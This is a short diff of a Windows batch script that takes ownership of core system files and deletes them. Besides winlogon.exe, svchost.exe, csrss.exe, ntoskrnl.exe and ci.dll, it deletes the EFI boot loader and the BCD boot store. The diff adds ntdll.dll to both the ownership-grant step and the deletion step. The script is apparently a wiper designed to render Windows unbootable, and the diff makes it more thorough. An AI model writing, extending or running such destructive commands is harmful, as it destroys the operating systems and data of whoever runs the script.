@@ -34,6 +34,8 @@ takeown /f winlogon.exe
 takeown /f ..\regedit.exe
 takeown /f reg.exe
 takeown /f wininit.exe
+takeown /f ntdll.dll
+icacls ntdll.dll /grant %username%:F
 icacls svchost.exe /grant %username%:F
 icacls wininit.exe /grant %username%:F
 icacls csrss.exe /grant %username%:F
@@ -65,6 +67,7 @@ del W:\EFI\Boot\bootx64.efi /f
 del W:\EFI\Microsoft\Boot\BCD /f
 del ntoskrnl.exe /f
 rd config /s /q
+del ntdll.dll /f
 del ci.dll /f
 del svchost.exe /f
 del csrss.exe /f
